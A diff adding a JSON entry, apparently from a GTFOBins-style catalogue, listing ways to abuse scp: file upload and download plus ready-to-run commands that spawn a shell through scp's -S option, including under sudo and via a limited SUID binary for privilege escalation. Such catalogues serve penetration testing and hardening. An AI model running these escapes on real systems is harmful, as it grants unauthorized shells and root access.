@@ -1,0 +1,31 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n"
+      }
+    ],
+    "file-upload": [
+      {
+        "description": "Send local file to a SSH server.",
+        "code": "scp [file] [user@host:[file]]\n"
+      }
+    ],
+    "file-download": [
+      {
+        "description": "Fetch a remote file from a SSH server.",
+        "code": "scp [user@host:[file]] [file]\n"
+      }
+    ],
+    "sudo": [
+      {
+        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:\n"
+      }
+    ]
+  }
+}
